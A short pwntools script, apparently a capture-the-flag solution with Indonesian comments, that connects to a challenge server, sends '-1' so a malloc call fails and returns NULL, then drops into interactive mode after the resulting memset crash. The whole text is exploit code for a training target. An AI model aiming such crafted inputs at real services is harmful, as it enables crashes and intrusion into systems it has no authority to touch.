from pwn import *
io = remote('chall1.lagncra.sh', 14675)
# Kirim -1 agar malloc gagal dan mengembalikan NULL
io.sendline(b"-1")
# Langsung masuk mode interaktif karena crash terjadi di memset
io.interactive()
